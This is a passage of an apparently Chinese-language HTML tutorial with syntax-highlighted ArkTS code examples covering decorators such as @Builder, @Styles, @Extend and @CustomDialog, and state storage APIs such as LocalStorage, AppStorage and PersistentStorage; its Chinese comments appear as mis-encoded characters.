  <span class="hljs-comment">// å…¨å±€@Builderï¼ˆåœ¨structå¤–éƒ¨ï¼‰</span>
  <span class="hljs-meta">@Builder</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">GlobalHeader</span>(<span class="hljs-params">title: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-title class_">Row</span>() {
      <span class="hljs-title class_">Text</span>(title)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">24</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-number">60</span>)
    .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#f0f0f0'</span>)
  }
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-title class_">GlobalHeader</span>(<span class="hljs-string">'My Page'</span>)
      
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Count: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.count}</span>`</span>)
      
      <span class="hljs-comment">// å¤ç”¨è‡ªå®šä¹‰æ„å»ºå‡½æ•°</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">CustomButton</span>(<span class="hljs-string">'Increase'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++;
      })
      
      <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">CustomButton</span>(<span class="hljs-string">'Decrease'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>--;
      })
      
      <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">CustomButton</span>(<span class="hljs-string">'Reset'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span> = <span class="hljs-number">0</span>;
      })
    }
  }
}
</code></pre>
<h3 data-id="heading-58">7. @Styles æ ·å¼å¤ç”¨</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å…¨å±€@Styles</span>
<span class="hljs-meta">@Styles</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">globalFancyText</span>(<span class="hljs-params"/>) {
  .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">20</span>)
  .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Blue</span>)
  .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
}

<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">StylesExample</span> {
  <span class="hljs-comment">// ç»„ä»¶å†…@Styles</span>
  <span class="hljs-meta">@Styles</span> <span class="hljs-title function_">fancyButton</span>(<span class="hljs-params"/>) {
    .<span class="hljs-title function_">width</span>(<span class="hljs-number">200</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
    .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Orange</span>)
    .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">25</span>)
  }
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-comment">// ä½¿ç”¨å…¨å±€æ ·å¼</span>
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Global Style'</span>)
        .<span class="hljs-title function_">globalFancyText</span>()
      
      <span class="hljs-comment">// ä½¿ç”¨ç»„ä»¶æ ·å¼</span>
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Fancy Button'</span>)
        .<span class="hljs-title function_">fancyButton</span>()
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Another Fancy Button'</span>)
        .<span class="hljs-title function_">fancyButton</span>()
    }
  }
}
</code></pre>
<h3 data-id="heading-59">8. @Extend æ‰©å±•ç»„ä»¶æ ·å¼</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// @Extendåªèƒ½ç”¨äºæ‰©å±•å†…ç½®ç»„ä»¶</span>
<span class="hljs-meta">@Extend</span>(<span class="hljs-title class_">Text</span>) <span class="hljs-keyword">function</span> <span class="hljs-title function_">fancyText</span>(<span class="hljs-params">fontSize: <span class="hljs-built_in">number</span>, color: Color</span>) {
  .<span class="hljs-title function_">fontSize</span>(fontSize)
  .<span class="hljs-title function_">fontColor</span>(color)
  .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
  .<span class="hljs-title function_">textAlign</span>(<span class="hljs-title class_">TextAlign</span>.<span class="hljs-property">Center</span>)
  .<span class="hljs-title function_">padding</span>(<span class="hljs-number">10</span>)
  .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#f5f5f5'</span>)
  .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">8</span>)
}

<span class="hljs-meta">@Extend</span>(<span class="hljs-title class_">Button</span>) <span class="hljs-keyword">function</span> <span class="hljs-title function_">primaryButton</span>(<span class="hljs-params"/>) {
  .<span class="hljs-title function_">width</span>(<span class="hljs-number">200</span>)
  .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
  .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Blue</span>)
  .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">White</span>)
  .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">25</span>)
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ExtendExample</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-comment">// ä½¿ç”¨æ‰©å±•æ ·å¼</span>
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Extended Text'</span>)
        .<span class="hljs-title function_">fancyText</span>(<span class="hljs-number">18</span>, <span class="hljs-title class_">Color</span>.<span class="hljs-property">Red</span>)
      
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Another Text'</span>)
        .<span class="hljs-title function_">fancyText</span>(<span class="hljs-number">16</span>, <span class="hljs-title class_">Color</span>.<span class="hljs-property">Green</span>)
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Primary Action'</span>)
        .<span class="hljs-title function_">primaryButton</span>()
    }
  }
}
</code></pre>
<h3 data-id="heading-60">9. @CustomDialog è‡ªå®šä¹‰å¼¹çª—</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@CustomDialog</span>
struct <span class="hljs-title class_">CustomDialogExample</span> {
  <span class="hljs-attr">controller</span>: <span class="hljs-title class_">CustomDialogController</span>;
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'Dialog Title'</span>;
  <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'Dialog message'</span>;
  <span class="hljs-attr">confirm</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">title</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">20</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
      
      <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">16</span>)
      
      <span class="hljs-title class_">Row</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Cancel'</span>)
          .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">controller</span>.<span class="hljs-title function_">close</span>();
          })
        
        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Confirm'</span>)
          .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">confirm</span>();
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">controller</span>.<span class="hljs-title function_">close</span>();
          })
      }
    }
    .<span class="hljs-title function_">padding</span>(<span class="hljs-number">20</span>)
  }
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">DialogPage</span> {
  <span class="hljs-attr">dialogController</span>: <span class="hljs-title class_">CustomDialogController</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomDialogController</span>({
    <span class="hljs-attr">builder</span>: <span class="hljs-title class_">CustomDialogExample</span>({
      <span class="hljs-attr">title</span>: <span class="hljs-string">'Delete Confirmation'</span>,
      <span class="hljs-attr">message</span>: <span class="hljs-string">'Are you sure you want to delete this item?'</span>,
      <span class="hljs-attr">confirm</span>: <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">'Item deleted'</span>);
      }
    }),
    <span class="hljs-attr">autoCancel</span>: <span class="hljs-literal">true</span>
  });
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Show Dialog'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">dialogController</span>.<span class="hljs-title function_">open</span>();
        })
    }
  }
}
</code></pre>
<h3 data-id="heading-61">10. @AnimatableExtend å¯åŠ¨ç”»å±æ€§æ‰©å±•</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@AnimatableExtend</span>(<span class="hljs-title class_">Text</span>) <span class="hljs-keyword">function</span> <span class="hljs-title function_">animatableFontSize</span>(<span class="hljs-params">size: <span class="hljs-built_in">number</span></span>) {
  .<span class="hljs-title function_">fontSize</span>(size)
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">AnimationExample</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">fontSize</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">20</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Animated Text'</span>)
        .<span class="hljs-title function_">animatableFontSize</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">fontSize</span>)
        .<span class="hljs-title function_">animation</span>({
          <span class="hljs-attr">duration</span>: <span class="hljs-number">500</span>,
          <span class="hljs-attr">curve</span>: <span class="hljs-title class_">Curve</span>.<span class="hljs-property">EaseInOut</span>
        })
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Increase Font'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">fontSize</span> += <span class="hljs-number">5</span>;
        })
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Decrease Font'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">fontSize</span> -= <span class="hljs-number">5</span>;
        })
    }
  }
}
</code></pre>
<h3 data-id="heading-62">11. @Concurrent å¹¶å‘è£…é¥°å™¨</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// @Concurrentç”¨äºæ ‡è®°å¯ä»¥å¹¶å‘æ‰§è¡Œçš„å‡½æ•°</span>
<span class="hljs-meta">@Concurrent</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">heavyComputation</span>(<span class="hljs-params">data: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-comment">// è€—æ—¶è®¡ç®—</span>
  <span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; data.<span class="hljs-property">length</span>; i++) {
    sum += data[i] * data[i];
  }
  <span class="hljs-keyword">return</span> sum;
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ConcurrentExample</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">result</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">loading</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>;
  
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">performHeavyTask</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">1000000</span> }, <span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> i);
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// åœ¨å­çº¿ç¨‹ä¸­æ‰§è¡Œ</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">result</span> = <span class="hljs-keyword">await</span> taskpool.<span class="hljs-title function_">execute</span>(heavyComputation, data);
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Task failed:'</span>, error);
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span> = <span class="hljs-literal">false</span>;
    }
  }
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span>) {
        <span class="hljs-title class_">LoadingProgress</span>()
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Result: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.result}</span>`</span>)
      }
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Start Heavy Task'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">performHeavyTask</span>();
        })
    }
  }
}
</code></pre>
<h3 data-id="heading-63">12. @Reusable ç»„ä»¶å¤ç”¨</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// @Reusableæ ‡è®°å¯å¤ç”¨ç»„ä»¶ï¼Œæå‡æ€§èƒ½</span>
<span class="hljs-meta">@Reusable</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ReusableListItem</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">item</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">''</span>;
  
  <span class="hljs-comment">// ç»„ä»¶å³å°†è¢«å¤ç”¨æ—¶è°ƒç”¨</span>
  <span class="hljs-title function_">aboutToReuse</span>(<span class="hljs-params">params: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">Object</span>&gt;</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">item</span> = params.<span class="hljs-property">item</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>;
  }
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Row</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">item</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">16</span>)
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
    .<span class="hljs-title function_">padding</span>(<span class="hljs-number">10</span>)
  }
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ReusableListExample</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">items</span>: <span class="hljs-built_in">string</span>[] = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">100</span> }, <span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> <span class="hljs-string">`Item <span class="hljs-subst">${i}</span>`</span>);
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">List</span>() {
      <span class="hljs-title class_">ForEach</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>, <span class="hljs-function">(<span class="hljs-params">item: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
        <span class="hljs-title class_">ListItem</span>() {
          <span class="hljs-title class_">ReusableListItem</span>({ <span class="hljs-attr">item</span>: item })
        }
      })
    }
  }
}
</code></pre>
<h3 data-id="heading-64">13. èµ„æºå¼•ç”¨ç³»ç»Ÿ</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ResourceExample</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-comment">// $rå¼•ç”¨èµ„æºæ–‡ä»¶</span>
      <span class="hljs-title class_">Text</span>($r(<span class="hljs-string">'app.string.hello'</span>))  <span class="hljs-comment">// å¼•ç”¨å­—ç¬¦ä¸²èµ„æº</span>
        .<span class="hljs-title function_">fontSize</span>($r(<span class="hljs-string">'app.float.title_font_size'</span>))  <span class="hljs-comment">// å¼•ç”¨æ•°å€¼èµ„æº</span>
        .<span class="hljs-title function_">fontColor</span>($r(<span class="hljs-string">'app.color.primary'</span>))  <span class="hljs-comment">// å¼•ç”¨é¢œè‰²èµ„æº</span>
      
      <span class="hljs-title class_">Image</span>($r(<span class="hljs-string">'app.media.icon'</span>))  <span class="hljs-comment">// å¼•ç”¨å›¾ç‰‡èµ„æº</span>
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
        .<span class="hljs-title function_">height</span>(<span class="hljs-number">100</span>)
      
      <span class="hljs-comment">// $rawfileå¼•ç”¨rawfileç›®å½•ä¸‹çš„æ–‡ä»¶</span>
      <span class="hljs-title class_">Image</span>($rawfile(<span class="hljs-string">'background.png'</span>))
      
      <span class="hljs-comment">// ä½¿ç”¨èµ„æºçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²</span>
      <span class="hljs-title class_">Text</span>($r(<span class="hljs-string">'app.string.welcome_message'</span>, <span class="hljs-string">'Zhang San'</span>))
    }
  }
}
</code></pre>
<h3 data-id="heading-65">14. LocalStorage é¡µé¢çº§çŠ¶æ€ç®¡ç†</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// åˆ›å»ºLocalStorageå®ä¾‹</span>
<span class="hljs-keyword">let</span> storage = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LocalStorage</span>({ <span class="hljs-string">'count'</span>: <span class="hljs-number">0</span> });

<span class="hljs-meta">@Entry</span>(storage)
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">PageA</span> {
  <span class="hljs-comment">// @LocalStorageLinkåŒå‘ç»‘å®š</span>
  <span class="hljs-meta">@LocalStorageLink</span>(<span class="hljs-string">'count'</span>) <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Count: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.count}</span>`</span>)
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Increase'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++;
        })
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Go to Page B'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          router.<span class="hljs-title function_">pushUrl</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">'pages/PageB'</span> });
        })
    }
  }
}

<span class="hljs-meta">@Entry</span>(storage)
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">PageB</span> {
  <span class="hljs-comment">// @LocalStoragePropå•å‘åŒæ­¥</span>
  <span class="hljs-meta">@LocalStorageProp</span>(<span class="hljs-string">'count'</span>) <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Count from Page A: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.count}</span>`</span>)
    }
  }
}
</code></pre>
<h3 data-id="heading-66">15. AppStorage åº”ç”¨çº§çŠ¶æ€ç®¡ç†</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// åˆå§‹åŒ–åº”ç”¨å…¨å±€çŠ¶æ€</span>
<span class="hljs-title class_">AppStorage</span>.<span class="hljs-title class_">SetOrCreate</span>(<span class="hljs-string">'userInfo'</span>, { <span class="hljs-attr">name</span>: <span class="hljs-string">'Guest'</span>, <span class="hljs-attr">isLoggedIn</span>: <span class="hljs-literal">false</span> });
<span class="hljs-title class_">AppStorage</span>.<span class="hljs-title class_">SetOrCreate</span>(<span class="hljs-string">'theme'</span>, <span class="hljs-string">'light'</span>);

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">HomePage</span> {
  <span class="hljs-comment">// @StorageLinkåŒå‘ç»‘å®šåº”ç”¨å…¨å±€çŠ¶æ€</span>
  <span class="hljs-meta">@StorageLink</span>(<span class="hljs-string">'userInfo'</span>) <span class="hljs-attr">userInfo</span>: <span class="hljs-built_in">object</span> = {};
  <span class="hljs-meta">@StorageLink</span>(<span class="hljs-string">'theme'</span>) <span class="hljs-attr">theme</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'light'</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`User: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.userInfo[<span class="hljs-string">'name'</span>]}</span>`</span>)
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Theme: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.theme}</span>`</span>)
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Toggle Theme'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">theme</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">theme</span> === <span class="hljs-string">'light'</span> ? <span class="hljs-string">'dark'</span> : <span class="hljs-string">'light'</span>;
        })
    }
  }
}

<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">SettingsPage</span> {
  <span class="hljs-comment">// @StoragePropå•å‘åŒæ­¥</span>
  <span class="hljs-meta">@StorageProp</span>(<span class="hljs-string">'theme'</span>) <span class="hljs-attr">theme</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'light'</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Current Theme: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.theme}</span>`</span>)
    }
  }
}
</code></pre>
<h3 data-id="heading-67">16. PersistentStorage æŒä¹…åŒ–å­˜å‚¨</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æŒä¹…åŒ–å­˜å‚¨ï¼Œåº”ç”¨é‡å¯åæ•°æ®ä»ç„¶å­˜åœ¨</span>
<span class="hljs-title class_">PersistentStorage</span>.<span class="hljs-title class_">PersistProp</span>(<span class="hljs-string">'token'</span>, <span class="hljs-string">''</span>);
<span class="hljs-title class_">PersistentStorage</span>.<span class="hljs-title class_">PersistProp</span>(<span class="hljs-string">'username'</span>, <span class="hljs-string">'Guest'</span>);

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">LoginPage</span> {
  <span class="hljs-meta">@StorageLink</span>(<span class="hljs-string">'token'</span>) <span class="hljs-attr">token</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">''</span>;
  <span class="hljs-meta">@StorageLink</span>(<span class="hljs-string">'username'</span>) <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">''</span>;
  
  <span class="hljs-title function_">login</span>(<span class="hljs-params">username: <span class="hljs-built_in">string</span>, password: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-comment">// ç™»å½•é€»è¾‘</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span> = <span class="hljs-string">'generated_token'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">username</span> = username;
    <span class="hljs-comment">// æ•°æ®ä¼šè‡ªåŠ¨æŒä¹…åŒ–</span>
  }
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span>) {
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Welcome, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.username}</span>`</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Login'</span>)
          .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">login</span>(<span class="hljs-string">'user123'</span>, <span class="hljs-string">'password'</span>);
          })
      }
    }
  }
}
</code></pre>
<h3 data-id="heading-68">17. Environment ç¯å¢ƒå˜é‡</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç›‘å¬ç³»ç»Ÿç¯å¢ƒå˜åŒ–</span>
<span class="hljs-title class_">Environment</span>.<span class="hljs-title class_">EnvProp</span>(<span class="hljs-string">'colorMode'</span>, <span class="hljs-title class_">ColorMode</span>.<span class="hljs-property">LIGHT</span>);
<span class="hljs-title class_">Environment</span>.<span class="hljs-title class_">EnvProp</span>(<span class="hljs-string">'languageCode'</span>, <span class="hljs-string">'zh'</span>);

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">EnvironmentExample</span> {
  <span class="hljs-meta">@StorageProp</span>(<span class="hljs-string">'colorMode'</span>) <span class="hljs-attr">colorMode</span>: <span class="hljs-built_in">number</span> = <span class="hljs-title class_">ColorMode</span>.<span class="hljs-property">LIGHT</span>;
  <span class="hljs-meta">@StorageProp</span>(<span class="hljs-string">'languageCode'</span>) <span class="hljs-attr">language</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'zh'</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Color Mode: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.colorMode === ColorMode.LIGHT ? <span class="hljs-string">'Light'</span> : <span class="hljs-string">'Dark'</span>}</span>`</span>)
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Language: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.language}</span>`</span>)
    }
